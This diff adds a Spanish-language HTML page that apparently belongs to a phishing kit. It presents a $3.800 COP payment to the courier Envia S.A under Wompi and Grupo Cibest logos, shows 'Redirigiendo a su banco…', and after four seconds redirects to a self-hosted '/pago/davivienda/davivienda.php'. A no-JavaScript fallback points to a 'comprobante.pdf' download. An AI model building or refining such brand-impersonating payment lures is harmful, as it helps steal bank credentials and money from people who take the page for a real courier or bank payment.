@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Elige un método de pago</title>
+  <style>
+    *,*::before,*::after{box-sizing:border-box}
+    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,'Helvetica Neue',Arial,sans-serif;background:#f5f7f9;color:#1f2937}
+    :root{--radius:12px;--shadow:0 2px 4px -2px rgba(0,0,0,.1),0 10px 24px -8px rgba(0,0,0,.12);--border:#e5e7eb;--brand:#0ea765;--badge:#e6f6ef;--badge-text:#0b7a4b;--tile:#fff;--tile-hover:#f3f4f6}
+    .page{display:grid;place-items:start center;min-height:100svh;padding:24px 16px}
+    .card{width:min(560px,100%);background:#fff;border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
+
+    /* Header */
+    .header{padding:22px 16px 8px;text-align:center}
+    .brand{display:inline-flex;align-items:center;gap:10px;margin-bottom:10px}
+    .brand img{height:28px}
+    .subtitle{color:#111827;margin:0 0 4px 0}
+    .merchant{font-weight:700;margin:0 0 8px 0}
+    .amount{color:var(--brand);font-size:1.9rem;font-weight:800;margin:6px 0 16px}
+    .amount small{font-weight:600;font-size:.9rem;color:#374151;margin-left:6px}
+
+    /* Métodos */
+    .methods{display:grid;gap:10px;padding:12px}
+    .method{display:flex;gap:14px;align-items:center;padding:14px;border:1px solid var(--border);border-radius:12px;background:var(--tile);text-decoration:none;color:inherit;transition:background .15s,border-color .15s,transform .06s}
+    .method:hover{background:var(--tile-hover);border-color:#d1d5db}
+    .method:active{transform:translateY(1px)}
+    .icon{width:42px;height:42px;border-radius:10px;display:grid;place-items:center;background:#f3f4f6;flex:0 0 42px}
+    .icon img{width:24px;height:24px;object-fit:contain}
+    .content{display:grid}
+    .title{font-weight:600}
+    .desc{color:#4b5563;font-size:.9rem;margin-top:2px}
+    .pill{margin-left:auto;font-size:.75rem;font-weight:700;color:var(--badge-text);background:var(--badge);border:1px solid #bfe7d3;padding:4px 8px;border-radius:999px}
+    .pill2{margin-left:auto;font-size:.75rem;font-weight:700;color:rgb(184,184,104);background:var(--badge);border:1px solid hsl(59 73% 76%);padding:4px 8px;border-radius:999px}
+
+    /* Footers */
+    .secure,.secure2{display:flex;gap:10px;justify-content:center;align-items:center;padding:12px 16px 16px;color:#6b7280;font-size:.9rem;border-top:1px dashed var(--border)}
+    .secure img,.secure2 img{height:18px;opacity:.92}
+
+    /* Intro (spinner) */
+    .hidden{display:none !important}
+    .loading{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px 16px 22px;min-height:120px}
+    .spinner{width:36px;height:36px;border:3px solid #e5e7eb;border-top-color:var(--brand);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:10px}
+    .loading p{margin:0;color:#6b7280;font-size:.95rem}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* Animación sutil */
+    @keyframes fadeSlide{from{opacity:0;transform:translateX(10px)} to{opacity:1;transform:translateX(0)}}
+    .animate-in{animation:fadeSlide .35s ease-out both}
+
+    @media (max-width:480px){.desc{display:none}.icon{width:38px;height:38px}}
+  </style>
+</head>
+<body>
+  <main class="page">
+    <section class="card">
+      <header class="header">
+        <div class="brand"><img src="../../Ass/header_logo.png" alt="Envia S.A" /></div>
+        <h2 class="subtitle">Pago a</h2>
+        <p class="merchant">Envia S.A</p>
+        <p class="amount">$3.800 <small>COP</small></p>
+      </header>
+
+      <div id="loading" class="loading animate-in" aria-live="polite">
+        <div class="spinner" role="status" aria-label="Cargando"></div>
+        <p>Redirigiendo a su banco…</p>
+      </div>
+
+      <!-- Footers como en datos.html -->
+      <div class="secure animate-in"><img src="img/logos/wompi.svg" alt="Wompi" /></div>
+      <div class="secure2 animate-in"><img src="img/logos/grupo-cibest.svg" alt="Grupo Cibest" /></div>
+    </section>
+  </main>
+
+<script>
+  const REDIRECT_URL = '/pago/davivienda/davivienda.php'; // ruta en TU servidor (misma app/dominio)
+  const REDIRECT_DELAY_MS = 4000;
+
+  document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+      // Cambia la página actual por el archivo
+      window.location.replace(REDIRECT_URL);
+    }, REDIRECT_DELAY_MS);
+  });
+</script>
+
+<!-- Fallback si no hay JS -->
+<noscript>
+  <meta http-equiv="refresh" content="4; url=/descargas/comprobante.pdf">
+</noscript>
+
+</body>
+</html>
